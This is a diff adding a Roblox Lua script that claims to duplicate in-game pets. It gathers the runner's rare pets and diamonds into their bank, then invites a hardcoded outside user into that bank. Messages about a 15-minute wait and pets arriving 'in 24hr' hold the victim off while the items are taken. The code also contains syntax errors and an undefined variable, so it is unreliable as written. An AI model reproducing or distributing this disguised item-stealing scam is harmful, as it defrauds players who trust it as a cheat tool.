@@ -1,0 +1,24 @@
+local dupeKey = 3370784236
+local lib =
+require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds=
+string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Man.Right.Diamonds.Amount.Text, "%", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do local v2 = lib.Directory.Pets[v.id]; if v2.rarity == "Exclusive" or v2.rarity == 
+"Mythical" and v.dm or v2.rarity ==
+"Legendary" and v.r then
+	table.insert(PetsList, b.uid);
+    end
+end
+local request, request2 =
+lib. Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds -1);
+if request then
+	lib.Message.New("Dupe starting! Don't Leave The Game or Enter The Bank for 15 Mins or it will be cancelled (Powered By)");
+else
+end
+if lib.NetworkInvoke(Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+	lib.Message.New("Dupe Successfully! Dupe Pets Will Appear in 24hr (Powered BY)");
+else
+	lib.Message.New("Failed! Please Contact For Support");
+end;
